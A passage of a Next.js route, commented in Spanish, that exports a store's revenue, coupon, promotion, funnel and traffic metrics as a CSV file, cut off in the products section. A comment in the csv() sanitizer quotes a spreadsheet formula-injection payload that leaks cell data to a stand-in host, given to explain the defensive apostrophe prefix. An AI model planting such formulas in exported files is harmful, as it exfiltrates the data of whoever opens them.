import { NextRequest, NextResponse } from "next/server";
import { getCurrentUser } from "@/lib/auth-session";
import { prisma } from "@/lib/prisma";
import { aggregateProfitability, gananciaPorPedido, type ProfitOrderItem } from "@/lib/margin";
import { parseOrderPromoSummary } from "@/lib/email";
import { resumirCarritos, resumirCupones, resumirPromos, compararCompra, resumirJuego, elegirCampanas } from "@/lib/metricas-marketing";
import { armarResumen } from "@/lib/resumen-mes";
import { ESTADOS_VENTA_CONFIRMADA_LISTA } from "@/lib/order-status";
import {
  getArgentinaDayKey, diaArgentino, inicioDiaArgentino, sumarDiasCalendario,
} from "@/lib/fechas-comerciales";
import { ordenarOrigenes, ORIGENES, NOMBRE_ORIGEN, type Origen } from "@/lib/origen-visita";
import { armarEmbudo } from "@/lib/embudo";
import { resumirClientes } from "@/lib/clientes";
import { resolverRango, etiquetaComparacion, fechaLarga } from "@/lib/rango-fechas";
import { AVISO_RETENCION } from "@/lib/retencion";

/**
 * Un valor listo para meter en una celda de CSV.
 *
 * Los nombres de cupones y promos los escribe la dueña, así que pueden traer
 * comas —"3x2, solo pantalones"— y ahí el archivo se parte en dos columnas y
 * corre todo lo que sigue. También comillas y saltos de línea.
 *
 * La regla del formato: si hay coma, comilla o salto, se envuelve todo entre
 * comillas y las comillas de adentro se duplican. Excel y Google Sheets lo
 * entienden así.
 */
function csv(valor: string): string {
  const texto = String(valor ?? "");

  // Una celda que arranca con `=`, `+`, `-`, `@`, tab o retorno NO es texto para
  // Excel ni para Sheets: es una fórmula, y la ejecutan al abrir el archivo.
  // Una promo llamada `=HYPERLINK("http://x.com?"&A1,"Ver")` se convierte en un
  // link que se lleva los datos de la planilla, y hay variantes que llegan a
  // ejecutar comandos.
  //
  // Las comillas de abajo NO alcanzan: `"=1+1"` sigue siendo una fórmula. Lo que
  // corta es el apóstrofo adelante, que fuerza a leerlo como texto y no se ve en
  // la celda. Acá los nombres los escribe la dueña —o sea que se lo haría a sí
  // misma— pero estos archivos se mandan por mail al contador, y el que lo abre
  // no tiene por qué comerse eso.
  const seguro = /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto;

  return /[",\r\n]/.test(seguro) ? `"${seguro.replace(/"/g, '""')}"` : seguro;
}

/**
 * Un monto que puede no saberse. Celda VACÍA cuando es `null`, nunca 0: en una
 * planilla un 0 se suma, se promedia y se grafica como si fuera un dato, y ahí
 * un cupón al que le falta el costo cargado arrastraría para abajo la ganancia
 * de todos. Vacío es lo único que Excel y Sheets tratan como "no hay dato".
 */
const montoOVacio = (n: number | null) => (n === null ? "" : String(Math.round(n)));

export async function GET(req: NextRequest) {
  const user = await getCurrentUser();
  if (!user) return NextResponse.json({ error: "No autorizado" }, { status: 401 });

  const store = await prisma.store.findUnique({
    where: { ownerId: user.id },
    select: { id: true, name: true, slug: true, tipoTienda: true },
  });
  if (!store) return NextResponse.json({ error: "Sin tienda" }, { status: 404 });
  const isAutos = store.tipoTienda === "AUTOS";

  const { searchParams } = new URL(req.url);
  const now = new Date();

  // El MISMO resolvedor que la pantalla, y por eso recibe fechas y no un preset.
  // Antes esto tenía su propia cuenta: mientras hubo tres botones fijos las dos
  // daban lo mismo, pero con un rango a medida el archivo se hubiera armado con
  // otro período que el de la pantalla y no habría nada que lo delatara.
  const hoyDia = getArgentinaDayKey();
  const rango = resolverRango(
    {
      range: searchParams.get("range") ?? undefined,
      desde: searchParams.get("desde") ?? undefined,
      hasta: searchParams.get("hasta") ?? undefined,
      comparar: searchParams.get("comparar") ?? undefined,
    },
    hoyDia
  );
  const range = rango.actual.dias;

  const days: { dateStr: string; revenue: number; orders: number; visits: number; cost: number; profit: number }[] = [];
  for (let i = range - 1; i >= 0; i--) {
    days.push({
      dateStr: sumarDiasCalendario(rango.actual.hasta, -i),
      revenue: 0, orders: 0, visits: 0, cost: 0, profit: 0,
    });
  }

  const startDate = inicioDiaArgentino(rango.actual.desde);
  const endDate = inicioDiaArgentino(sumarDiasCalendario(rango.actual.hasta, 1));

  const CONFIRMED = ESTADOS_VENTA_CONFIRMADA_LISTA;

  const prevStartDate = inicioDiaArgentino(rango.anterior.desde);
  // El recorte al tiempo transcurrido sólo vale si el período llega hasta hoy.
  // Con un rango cerrado del pasado los dos están enteros, y recortar el de
  // atrás le sacaría horas de ventas que sí ocurrieron.
  const prevEndDate = rango.incluyeHoy
    ? new Date(prevStartDate.getTime() + (now.getTime() - startDate.getTime()))
    : inicioDiaArgentino(sumarDiasCalendario(rango.anterior.hasta, 1));

  // Ver `DIAS_SIN_DESPACHAR` en la pantalla de Métricas: el mismo umbral.
  const sinDespacharDesde = inicioDiaArgentino(sumarDiasCalendario(hoyDia, -5));

  const [
    orders, views, carritosRaw, cuponesRaw, pedidosConCupon, pedidosConPromoRaw, girosRaw, promosActivasRaw,
    revenuePrevAgg, ordersPrevConfirmedCount, viewsPrevAgg, sinDespacharAgg,
  ] = await Promise.all([
    prisma.order.findMany({
      where: { storeId: store.id, createdAt: { gte: startDate, lt: endDate }, status: { not: "CANCELLED" } },
      // `couponId` y `subtotal` son para comparar el tamaño de la compra con
      // cupón contra sin cupón — la misma lista que ya se traía. `buyerId` es
      // para separar clientes nuevos de los que vuelven.
      select: { total: true, subtotal: true, couponId: true, status: true, createdAt: true, buyerId: true },
    }),
    prisma.storeView.findMany({
      where: { storeId: store.id, date: { gte: days[0].dateStr, lte: days[days.length - 1].dateStr } },
      select: { date: true, count: true },
    }).catch(() => [] as { date: string; count: number }[]),

    // Mismos filtros que la pantalla de Métricas — a propósito, y por eso los
    // números salen de las mismas funciones de `lib/metricas-marketing`. Si el CSV
    // los recalculara por su cuenta, el día que se ajuste una regla el archivo y la
    // pantalla dirían cosas distintas y no habría forma de saber cuál miente.
    prisma.abandonedCart.findMany({
      where: { storeId: store.id, lastActivityAt: { gte: startDate, lt: endDate } },
      select: { total: true, reminderSentAt: true, recoveredAt: true },
    }),
    // Sólo los propios — ver el comentario largo en la pantalla de Métricas.
    prisma.coupon.findMany({
      where: { storeId: store.id, winnerEmail: null },
      select: {
        id: true, code: true, label: true, discountType: true, discountValue: true,
        expiresAt: true, isActive: true, createdAt: true,
      },
    }),
    prisma.order.findMany({
      where: {
        storeId: store.id, createdAt: { gte: startDate, lt: endDate },
        status: { in: CONFIRMED }, couponId: { not: null },
      },
      select: { id: true, couponId: true, discountAmount: true, total: true, coupon: { select: { winnerEmail: true } } },
    }),
    prisma.order.findMany({
      where: {
        storeId: store.id, createdAt: { gte: startDate, lt: endDate },
        status: { in: CONFIRMED }, promoSummary: { not: null },
      },
      select: { id: true, promoSummary: true, total: true },
    }),
    prisma.gamificationSpin.findMany({
      where: {
        widget: { storeId: store.id },
        createdAt: { gte: startDate, lt: endDate },
      },
      select: { email: true, prizeLabel: true, isNoPrize: true, couponId: true },
    }),
    prisma.storePromotion.findMany({
      where: {
        storeId: store.id,
        isActive: true,
        archivedAt: null,
        AND: [
          { OR: [{ startsAt: null }, { startsAt: { lt: endDate } }] },
          { OR: [{ endsAt: null }, { endsAt: { gte: startDate } }] },
        ],
      },
      select: { name: true },
    }),

    // ── Sólo para el resumen en texto ──
    prisma.order.aggregate({
      where: {
        storeId: store.id, createdAt: { gte: prevStartDate, lt: prevEndDate },
        status: { in: CONFIRMED },
      },
      _sum: { total: true },
    }),
    prisma.order.count({
      where: {
        storeId: store.id, createdAt: { gte: prevStartDate, lt: prevEndDate },
        status: { in: CONFIRMED },
      },
    }),
    prisma.storeView.aggregate({
      where: {
        storeId: store.id,
        date: { gte: rango.anterior.desde, lte: rango.anterior.hasta },
      },
      _sum: { count: true },
    }).catch(() => ({ _sum: { count: null } })),
    // Sin filtro de período a propósito: un pedido cobrado y trabado hace dos
    // meses es peor que uno de esta semana, y filtrando desaparecería del aviso
    // justo cuando más viejo se pone.
    prisma.order.aggregate({
      where: { storeId: store.id, status: "CONFIRMED", createdAt: { lt: sinDespacharDesde } },
      _count: true,
      _sum: { total: true },
    }),
  ]);

  const resumenCarritos = resumirCarritos(carritosRaw);
  // Cupones y promos se arman más abajo: necesitan la ganancia de cada pedido, y
  // ésa sale de los ítems que se traen en el bloque de rentabilidad.

  for (const o of orders) {
    const dateStr = diaArgentino(o.createdAt);
    const day = days.find(d => d.dateStr === dateStr);
    if (day) {
      day.orders++;
      if (CONFIRMED.includes(o.status)) day.revenue += o.total;
    }
  }
  for (const v of views) {
    const day = days.find(d => d.dateStr === v.date);
    if (day) day.visits += v.count;
  }

  // Costo/ganancia — solo tiendas con carrito (Autos vende por consulta, no usa Order/OrderItem)
  let hasCostData = false;
  let productsWithoutCost = 0;
  // #7c — los envíos bonificados del período. Va también acá y no solo en la
  // pantalla: este CSV es con lo que alguien hace las cuentas de verdad, y si
  // Métricas resta los envíos y el export no, uno de los dos miente.
  let shippingWaivedTotal = 0;
  if (!isAutos) {
    const waived = await prisma.order.aggregate({
      where: { storeId: store.id, status: { in: CONFIRMED }, createdAt: { gte: startDate, lt: endDate } },
      _sum: { shippingWaived: true },
    });
    shippingWaivedTotal = waived._sum.shippingWaived ?? 0;
  }
  let gananciaDePedido = new Map<string, number | null>();
  /**
   * Un renglón por producto vendido en el período, sin recorte.
   *
   * En pantalla esto son dos tarjetas cortadas —los 5 que más unidades vendieron
   * y los 8 que más ganancia dejaron— porque no entra más, y en el PDF llegan a
   * 30. El archivo no tiene ese problema: es el único de los tres formatos donde
   * la lista puede estar entera, y es justamente en el que alguien va a hacer
   * cuentas. Un ranking cortado en una planilla es una planilla que da mal.
   */
  let productosCsv: { nombre: string; unidades: number; facturado: number; ganancia: number | null; conCupon: boolean }[] = [];
  if (!isAutos) {
    const rawProfitItems = await prisma.orderItem.findMany({
      where: {
        order: { storeId: store.id, status: { in: CONFIRMED }, createdAt: { gte: startDate, lt: endDate } },
      },
      select: {
        orderId: true,
        productId: true, quantity: true, price: true, lineTotal: true, costAtSale: true,
        order: { select: { subtotal: true, discountAmount: true, createdAt: true } },
      },
    });
    const profitItems: ProfitOrderItem[] = rawProfitItems.map((it) => ({
      productId: it.productId, quantity: it.quantity, price: it.price, lineTotal: it.lineTotal, costAtSale: it.costAtSale,
      orderSubtotal: it.order.subtotal, orderDiscount: it.order.discountAmount,
      dateStr: diaArgentino(it.order.createdAt),
    }));
    const profitAgg = aggregateProfitability(profitItems);
    hasCostData = profitAgg.totalNetRevenueKnownCost > 0;
    productsWithoutCost = [...profitAgg.byProduct.values()].filter((p) => p.profit === null).length;
    for (const day of days) {
      day.cost = profitAgg.dailyCost.get(day.dateStr) ?? 0;
      day.profit = profitAgg.dailyProfit.get(day.dateStr) ?? 0;
    }
    gananciaDePedido = gananciaPorPedido(
      rawProfitItems.map((it) => ({
        orderId: it.orderId, quantity: it.quantity, price: it.price,
        lineTotal: it.lineTotal, costAtSale: it.costAtSale,
        orderSubtotal: it.order.subtotal, orderDiscount: it.order.discountAmount,
      }))
    );

    // Los nombres. Un producto borrado después de venderse ya no está en la
    // tabla, y su fila igual tiene que salir: la venta ocurrió.
    const nombres = new Map(
      (await prisma.product.findMany({
        where: { id: { in: [...profitAgg.byProduct.keys()] } },
        select: { id: true, name: true },
      })).map((p) => [p.id, p.name])
    );
    productosCsv = [...profitAgg.byProduct.entries()]
      .map(([id, p]) => ({
        nombre: nombres.get(id) ?? "Producto eliminado",
        unidades: p.quantity,
        facturado: Math.round(p.netRevenue),
        ganancia: p.profit === null ? null : Math.round(p.profit),
        conCupon: p.hasCoupon,
      }))
      // Por unidades y no por ganancia: la ganancia de la mitad puede estar
      // vacía, y ordenar por una columna que a veces no existe deja la planilla
      // con un orden que no se entiende. Para ordenar por ganancia está la
      // planilla: es una columna, se hace con un clic.
      .sort((a, b) => b.unidades - a.unidades);
  }

  // ── Marketing, con la ganancia ya disponible ──
  // De las mismas funciones que la pantalla y con los mismos números: si acá se
  // recalculara algo, el archivo y la pantalla podrían decir cosas distintas.
  const resumenCupones = resumirCupones(
    cuponesRaw,
    pedidosConCupon.map((o) => ({
      couponId: o.couponId,
      discountAmount: o.discountAmount,
      total: o.total,
      ganancia: gananciaDePedido.get(o.id) ?? null,
      esPremio: o.coupon?.winnerEmail != null,
    })),
    now,
    startDate
  );
  const resumenPromos = resumirPromos(
    pedidosConPromoRaw.map((o) => {
      const { appliedPromos, freeShippingPromo } = parseOrderPromoSummary(o.promoSummary);
      return {
        applied: appliedPromos,
        freeShipping: freeShippingPromo,
        total: o.total,
        ganancia: gananciaDePedido.get(o.id) ?? null,
      };
    }),
    promosActivasRaw.map((p) => p.name)
  );
  // Acotado a los giros del período, no a todos los premios de la historia.
  const idsPremiados = girosRaw.map((g) => g.couponId).filter((id): id is string => id !== null);
  const premiosCanjeados = idsPremiados.length
    ? await prisma.coupon.findMany({
        where: { id: { in: idsPremiados }, usedCount: { gt: 0 } },
        select: { id: true },
      })
    : [];
  const resumenJuego = resumirJuego(girosRaw, new Set(premiosCanjeados.map((c) => c.id)));
  const comparacionCompra = compararCompra(
    orders
      .filter((o) => CONFIRMED.includes(o.status))
      .map((o) => ({ couponId: o.couponId, subtotal: o.subtotal })),
  );

  const totalRevenue = days.reduce((s, d) => s + d.revenue, 0);
  const totalOrders = days.reduce((s, d) => s + d.orders, 0);
  const totalVisits = days.reduce((s, d) => s + d.visits, 0);

  // ── De dónde vinieron ──
  // Va en su propio await y no en el Promise.all de arriba: la tabla es nueva y
  // en un entorno sin la migración corrida la query tira. El `.catch` la deja en
  // vacío y el resto del archivo sale igual, que es lo mismo que ya hace la
  // query de visitas.
  const origenes = ordenarOrigenes(
    (await prisma.storeViewSource
      .groupBy({
        by: ["source"],
        where: { storeId: store.id, date: { gte: days[0].dateStr, lte: days[days.length - 1].dateStr } },
        _sum: { count: true },
      })
      .catch(() => [] as { source: string; _sum: { count: number | null } }[]))
      .filter((o) => (ORIGENES as readonly string[]).includes(o.source))
      .map((o) => ({ origen: o.source as Origen, visitas: o._sum.count ?? 0 }))
      .filter((o) => o.visitas > 0)
  );
  const visitasConOrigen = origenes.reduce((s, o) => s + o.visitas, 0);
  const totalCost = days.reduce((s, d) => s + d.cost, 0);
  const totalProfit = days.reduce((s, d) => s + d.profit, 0);

  // Solo mostrar Costo/Ganancia si hay al menos un producto con costo cargado —
  // si no, las columnas darían todas 0 y se confundirían con "ganancia cero real".
  const showProfit = !isAutos && hasCostData;

  // ── Ticket promedio ──
  // Arriba va plata de pedidos CONFIRMADOS (`day.revenue` sólo suma esos) así que
  // abajo tienen que ir los mismos. Este archivo dividía por `totalOrders`, que
  // cuenta todos los no cancelados: el mismo error que ya se había corregido en la
  // pantalla, pero acá seguía vivo. Con 10 pedidos de los cuales 5 confirmados, un
  // ticket real de $100.000 salía $50.000 — y empeoraba cuantos más pendientes hubiera.
  const confirmedOrders = orders.filter((o) => CONFIRMED.includes(o.status));
  const confirmedOrdersCount = confirmedOrders.length;
  const avgTicket = confirmedOrdersCount > 0 ? Math.round(totalRevenue / confirmedOrdersCount) : 0;

  // ── Clientes nuevos y los que vuelven ──
  // De la misma función que la pantalla, con la misma query. El `in` va acotado
  // a los compradores del período, no a todos los de la tienda.
  let clientesResumen = resumirClientes([]);
  {
    const compradores = [...new Set(confirmedOrders.map((o) => o.buyerId))];
    if (compradores.length > 0) {
      const primeras = await prisma.order.groupBy({
        by: ["buyerId"],
        where: { storeId: store.id, buyerId: { in: compradores }, status: { in: CONFIRMED } },
        _min: { createdAt: true },
      });
      const primeraDe = new Map(primeras.map((f) => [f.buyerId, f._min.createdAt]));
      clientesResumen = resumirClientes(
        confirmedOrders.map((o) => {
          const primera = primeraDe.get(o.buyerId);
          return {
            buyerId: o.buyerId,
            total: o.total,
            primeraCompraEnElPeriodo: primera != null && primera >= startDate,
          };
        })
      );
    }
  }

  // ── El embudo ──
  // Va acá abajo porque necesita los pedidos confirmados. Mismo `.catch` que el
  // desglose de origen y por lo mismo: la tabla es nueva y en un entorno sin la
  // migración corrida la query tira.
  //
  // De la MISMA función que la pantalla. Si el archivo armara el embudo por su
  // cuenta, el día que se ajuste un umbral los dos dirían cosas distintas.
  const pasosRaw = await prisma.storeFunnelStep
    .groupBy({
      by: ["step"],
      where: { storeId: store.id, date: { gte: days[0].dateStr, lte: days[days.length - 1].dateStr } },
      _sum: { count: true },
    })
    .catch(() => [] as { step: string; _sum: { count: number | null } }[]);
  const pasoCarrito = pasosRaw.find((p) => p.step === "carrito")?._sum.count ?? 0;
  const pasoCheckout = pasosRaw.find((p) => p.step === "checkout")?._sum.count ?? 0;
  const embudo = armarEmbudo(
    {
      entro: totalVisits,
      carrito: pasoCarrito,
      checkout: pasoCheckout,
      datos: carritosRaw.length,
      pedido: orders.length,
      pago: confirmedOrdersCount,
    },
    pasoCarrito === 0 && pasoCheckout === 0
  );

  // ── El resumen en texto ──
  // De la misma función que la pantalla, con los mismos números: si acá se
  // recalculara algo, el archivo y la pantalla podrían decir cosas distintas.
  const pedidosPendientes = orders.filter((o) => o.status === "PENDING");
  // Cero con un rango cerrado del pasado: no hay medio día colgando, los dos
  // períodos están enteros. Igual que en la pantalla.
  const fraccionDiaSinTranscurrir = rango.incluyeHoy
    ? 1 - (now.getTime() - inicioDiaArgentino(hoyDia).getTime()) / 86_400_000
    : 0;
  const resumen = armarResumen({
    dias: range,
    // Mismo margen que la pantalla: las visitas se guardan por día entero y hoy
    // va por la mitad. Ver el comentario largo en `resumen-mes.ts`.
    incertidumbreVisitasPct: (fraccionDiaSinTranscurrir / range) * 100,
    actual: { ingresos: totalRevenue, pedidosConfirmados: confirmedOrdersCount, visitas: totalVisits },
    previo: {
      ingresos: revenuePrevAgg._sum.total ?? 0,
      pedidosConfirmados: ordersPrevConfirmedCount,
      visitas: viewsPrevAgg._sum.count ?? 0,
    },
    senales: {
      carritosSinContactar: {
        cantidad: resumenCarritos.sinContactar.cantidad,
        monto: resumenCarritos.sinContactar.monto,
      },
      pedidosPendientes: {
        cantidad: pedidosPendientes.length,
        monto: pedidosPendientes.reduce((s, o) => s + o.total, 0),
      },
      confirmadosSinDespachar: {
        cantidad: sinDespacharAgg._count,
        dias: 5,
        monto: sinDespacharAgg._sum.total ?? 0,
      },
      cuponesVencidos: resumenCupones.filas.filter((f) => f.vencido).length,
      productosSinCosto: productsWithoutCost,
      enviosBonificados: shippingWaivedTotal,
    },
    marketing: {
      ...elegirCampanas(resumenCupones.filas, resumenPromos.filas),
      cuponesSinUsar: resumenCupones.sinUsar.length,
      promosSinUsar: resumenPromos.sinUsar.length,
    },
  });

  /**
   * El resumen va como líneas de comentario (`# …`) arriba de todo.
   *
   * Es prosa: metida en celdas, cada coma de una frase abriría una columna nueva
   * y la planilla quedaría con cien columnas vacías. Como comentario, Excel y
   * Google Sheets la muestran en la primera columna y las cuentas de abajo no se
   * tocan. Los saltos de línea sí romperían el comentario, así que se limpian.
   */
  const comentario = (texto: string) => `# ${texto.replace(/[\r\n]+/g, " ").trim()}`;
  const lineasResumen = [
    comentario("RESUMEN"),
    comentario(resumen.titular),
    ...resumen.parrafos.map(comentario),
    ...(resumen.pendientes.length > 0
      ? [comentario("Para revisar:"), ...resumen.pendientes.map((p) => comentario(`- ${p.texto}`))]
      : []),
    ``,
  ];

  // Va en una línea de comentario (`# …`), no en una celda: ahí las comas no
  // rompen nada, pero un salto de línea sí partiría el comentario en dos.
  const safeName = store.name.replace(/[\r\n]/g, " ").trim();
  const lines = [
    // Las fechas exactas y contra qué se compara. Un archivo que sólo dice
    // "últimos 30 días" no se puede ubicar tres meses después, y con la
    // comparación contra el año pasado el mismo "+40%" quiere decir otra cosa.
    `# Métricas de ${safeName} — ${fechaLarga(rango.actual.desde)} a ${fechaLarga(rango.actual.hasta)} (${range} ${range === 1 ? "dia" : "dias"})`,
    `# Comparado contra ${csv(etiquetaComparacion(rango))}: ${fechaLarga(rango.anterior.desde)} a ${fechaLarga(rango.anterior.hasta)}`,
    `# Exportado el ${new Date().toLocaleDateString("es-AR")}`,
    `# ${AVISO_RETENCION}`,
    ...(rango.aviso ? [`# OJO: ${rango.aviso}`] : []),
    ``,
    ...lineasResumen,
    `# NÚMEROS`,
    `Ingresos totales,${totalRevenue}`,
    `Pedidos totales,${totalOrders}`,
    `Pedidos confirmados,${confirmedOrdersCount}`,
    `Visitas totales,${totalVisits}`,
    `Ticket promedio,${avgTicket}`,
    ...(showProfit ? [`Costo total,${totalCost}`, `Ganancia total,${totalProfit}`] : []),
    // Se muestra aunque no haya costos cargados: el envío regalado es plata que
    // salió igual, y no depende de que los productos tengan costo.
    ...(shippingWaivedTotal > 0
      ? [`Envíos bonificados,${Math.round(shippingWaivedTotal)}`,
         ...(showProfit ? [`Ganancia después de envíos,${Math.round(totalProfit - shippingWaivedTotal)}`] : [])]
      : []),
    ``,
    ...(showProfit ? [`# Los productos sin costo cargado no están incluidos en Costo/Ganancia`, ``] : []),

    // ── Marketing ──
    // Cada sección se saltea entera si no tiene nada: un archivo con tres títulos
    // vacíos hace pensar que la exportación falló.
    ...(resumenCarritos.cantidad > 0 ? [
      `# CARRITOS ABANDONADOS`,
      `Carritos,${resumenCarritos.cantidad}`,
      `Monto total,${Math.round(resumenCarritos.monto)}`,
      `Recuperados,${resumenCarritos.recuperados.cantidad}`,
      `Monto recuperado,${Math.round(resumenCarritos.recuperados.monto)}`,
      `Con recordatorio sin recuperar,${resumenCarritos.contactados.cantidad}`,
      `Sin contactar,${resumenCarritos.sinContactar.cantidad}`,
      `Monto sin recuperar,${Math.round(resumenCarritos.montoPerdido)}`,
      `Tasa de recuperacion (%),${resumenCarritos.tasaRecuperacion}`,
      ``,
    ] : []),

    // La columna Facturado es la que permite comparar: sola, "Descontado" dice lo
    // que el cupón costó y no si valió la pena. Va antes que el descuento porque
    // es la que se lee primero.
    ...(resumenCupones.filas.length > 0 || resumenCupones.ruleta.usos > 0 ? [
      `# CUPONES`,
      `# Ganancia = lo facturado menos el costo de los productos y menos el descuento. Vacia = esos productos no tienen el costo cargado (no es cero)`,
      `Codigo,Descuento,Usos,Facturado (ARS),Descontado (ARS),Ganancia (ARS),Pedidos sin costo cargado,Vencido`,
      ...resumenCupones.filas.map(f =>
        `${csv(f.code)},${csv(f.etiqueta)},${f.usos},${Math.round(f.facturado)},${Math.round(f.descuento)},${montoOVacio(f.ganancia)},${f.pedidosSinCosto},${f.vencido ? "si" : "no"}`),
      `TOTAL,,${resumenCupones.usosTotales},${Math.round(resumenCupones.facturadoTotal)},${Math.round(resumenCupones.descuentoTotal)},${montoOVacio(resumenCupones.gananciaTotal)},${resumenCupones.pedidosSinCosto},`,
      // Aparte del TOTAL a propósito: si se sumaran juntos, no habría forma de
      // saber cuánto costó la ruleta y cuánto costaron los cupones propios.
      ...(resumenCupones.ruleta.usos > 0 ? [
        `# Los premios de la ruleta van aparte — cada ganador tiene su propio codigo de un solo uso`,
        `Premios de la ruleta,,${resumenCupones.ruleta.usos},${Math.round(resumenCupones.ruleta.facturado)},${Math.round(resumenCupones.ruleta.descuento)},${montoOVacio(resumenCupones.ruleta.ganancia)},${resumenCupones.ruleta.pedidosSinCosto},`,
      ] : []),
      ``,
    ] : []),

    // ¿El cupón hace que compren más, o se lo lleva quien ya compraba? Es lo más
    // cerca que se puede estar de "vendí gracias al cupón" sin un experimento.
    ...(comparacionCompra.diferenciaPct !== null ? [
      `# COMPRA PROMEDIO CON CUPON VS SIN CUPON`,
      `# Sobre el subtotal y antes del descuento: mide lo que la persona se llevo, sin el envio de por medio`,
      `# NO es el "Ticket promedio" de arriba, que va sobre el total del pedido`,
      `Grupo,Pedidos,Compra promedio (ARS)`,
      `Con cupon,${comparacionCompra.conCupon.pedidos},${Math.round(comparacionCompra.conCupon.promedio)}`,
      `Sin cupon,${comparacionCompra.sinCupon.pedidos},${Math.round(comparacionCompra.sinCupon.promedio)}`,
      `Diferencia (%),,${comparacionCompra.diferenciaPct}`,
      ``,
    ] : []),

    // Lo que NO se usó. La sección de arriba sólo puede listar lo que entró en
    // algún pedido, o sea que sola nunca dice cuál campaña conviene apagar.
    ...(resumenCupones.sinUsar.length > 0 ? [
      `# CUPONES VIGENTES QUE NADIE USO`,
      `Codigo,Descuento`,
      ...resumenCupones.sinUsar.map(c => `${csv(c.code)},${csv(c.etiqueta)}`),
      ``,
    ] : []),

    ...(resumenPromos.filas.length > 0 ? [
      `# PROMOCIONES`,
      `# Ganancia = lo facturado menos el costo de los productos y menos el descuento. Vacia = falta el costo de esos productos (no es cero)`,
      `Promocion,Pedidos,Facturado (ARS),Monto resignado (ARS),Ganancia (ARS),Pedidos sin costo cargado`,
      ...resumenPromos.filas.map(f =>
        `${csv(f.etiqueta)},${f.pedidos},${Math.round(f.facturado)},${Math.round(f.ahorro)},${montoOVacio(f.ganancia)},${f.pedidosSinCosto}`),
      // Ni el total de pedidos ni el facturado ni la ganancia son la suma de su
      // columna: un pedido con dos promos aparece en dos filas y suma su plata en
      // las dos. Se aclara para que nadie sume a mano y crea que hay un error.
      `# Un pedido con dos promos aparece en dos filas — por eso las columnas Pedidos, Facturado y Ganancia suman mas que el TOTAL`,
      `TOTAL,${resumenPromos.pedidosConPromo} pedidos con promo,${Math.round(resumenPromos.facturadoTotal)},${Math.round(resumenPromos.ahorroTotal)},${montoOVacio(resumenPromos.gananciaTotal)},${resumenPromos.pedidosSinCosto}`,
      ``,
    ] : []),

    // La ruleta. "Canjeados" se mide hoy y no dentro del período a proposito: un
    // premio ganado el dia 28 se puede usar el 32.
    ...(resumenJuego.jugadas > 0 ? [
      `# RULETA / RASPADITA`,
      `Jugadas,${resumenJuego.jugadas}`,
      `Ganaron un premio,${resumenJuego.ganaron}`,
      `Premios ya canjeados,${resumenJuego.canjeados}`,
      `Emails distintos,${resumenJuego.emails}`,
      ``,
      `Premio,Veces`,
      ...resumenJuego.premios.map(p => `${csv(p.etiqueta)},${p.veces}`),
      ``,
    ] : []),

    ...(resumenPromos.sinUsar.length > 0 ? [
      `# PROMOCIONES ACTIVAS QUE NO ENTRARON EN NINGUN PEDIDO`,
      `Promocion`,
      ...resumenPromos.sinUsar.map(n => csv(n)),
      ``,
    ] : []),

    // Se cuenta la PERSONA y no el pedido, asi que las dos filas suman exacto
    // lo facturado y se pueden verificar contra "Ingresos totales" de arriba.
    ...(clientesResumen.nuevos.pedidos + clientesResumen.vuelven.pedidos > 0 ? [
      `# CLIENTES NUEVOS Y CLIENTES QUE VUELVEN`,
      `# Nuevo = su primera compra confirmada en esta tienda cayo dentro del periodo. Todo lo que gasto en el periodo cuenta como plata de cliente nuevo, aunque haya comprado varias veces`,
      `# Se reconoce a la persona por el mail con el que compra: si vuelve con otro mail, entra como nueva`,
      `# Solo pedidos confirmados`,
      `Grupo,Personas,Pedidos,Facturado (ARS),Ticket promedio (ARS)`,
      `Compraron por primera vez,${clientesResumen.nuevos.personas},${clientesResumen.nuevos.pedidos},${Math.round(clientesResumen.nuevos.facturado)},${Math.round(clientesResumen.nuevos.ticket)}`,
      `Ya te habian comprado,${clientesResumen.vuelven.personas},${clientesResumen.vuelven.pedidos},${Math.round(clientesResumen.vuelven.facturado)},${Math.round(clientesResumen.vuelven.ticket)}`,
      ...(clientesResumen.diferenciaTicketPct !== null
        ? [`# El que ya te habia comprado gasta un ${Math.abs(clientesResumen.diferenciaTicketPct)}% ${clientesResumen.diferenciaTicketPct > 0 ? "mas" : "menos"} por pedido`]
        : [`# No hay muestra suficiente de los dos lados para comparar los tickets`]),
      ``,
    ] : []),

    // El recorrido completo, de arriba abajo. Es el bloque que contesta "de las
    // cien personas que entraron, ¿dónde se me fueron las noventa y ocho?".
    ...(totalVisits > 0 ? [
      `# DONDE SE CAE LA GENTE`,
      `# Los porcentajes son aproximados: los tres primeros escalones cuentan una vez por navegador por dia, los datos una vez por persona, y los dos ultimos una vez por pedido`,
      `# Alguien que entra el lunes y compra el jueves suma arriba un dia y abajo otro`,
      ...(embudo.faltanPasosNuevos
        ? [`# OJO: "puso algo en el carrito" y "abrio el checkout" recien empezaron a medirse, por eso estan en cero`]
        : []),
      `# "Normal" son valores de referencia de comercio electronico, no una meta`,
      `Escalon,Personas,% de los de arriba,% del total,Se cayeron,% que pasa normalmente`,
      ...embudo.escalones.map(e =>
        `${csv(e.titulo)},${e.cantidad},${e.pctDelAnterior ?? ""},${e.pctDelTotal ?? ""},${e.perdidos},${e.clave === "entro" ? "" : 100 - e.caidaNormalPct}`),
      ...(embudo.peorCaida
        ? [`# El que mas se despega de lo normal: ${embudo.peorCaida.titulo}`]
        : []),
      ``,
    ] : []),

    // El porcentaje va sobre las visitas CON origen y no sobre el total: si se
    // dividiera por el total, todos los canales se achicarían a la vez cada vez
    // que falte una etiqueta y parecería que la tienda se cayó. La fila "SIN
    // ORIGEN" deja la resta a la vista para que nadie tenga que hacerla a mano.
    ...(visitasConOrigen > 0 ? [
      `# DE DONDE VINO LA GENTE`,
      `# Los porcentajes son sobre las ${visitasConOrigen} visitas con origen conocido, no sobre las ${totalVisits} del periodo`,
      `# OJO: WhatsApp abre los links en un navegador que casi nunca dice de donde viene, asi que parte de "Directo" en realidad salio de un WhatsApp. Mandando el link con ?utm_source=whatsapp se cuenta bien`,
      `# Esto cuenta VISITAS, no ventas`,
      `Origen,Visitas,Porcentaje`,
      ...origenes.map(o =>
        `${csv(NOMBRE_ORIGEN[o.origen])},${o.visitas},${Math.round((o.visitas / visitasConOrigen) * 100)}`),
      ...(totalVisits > visitasConOrigen
        ? [`SIN ORIGEN,${totalVisits - visitasConOrigen},`]
        : []),
      ``,
    ] : []),

    // Todos los productos vendidos, no un podio: es lo que la pantalla no puede
    // dar y el motivo por el que alguien baja el archivo.
    ...(productosCsv.length > 0 ? [
      `# PRODUCTOS VENDIDOS`,
      `# Facturado = lo que se cobro por ese producto, ya con el descuento del pedido repartido entre sus renglones`,
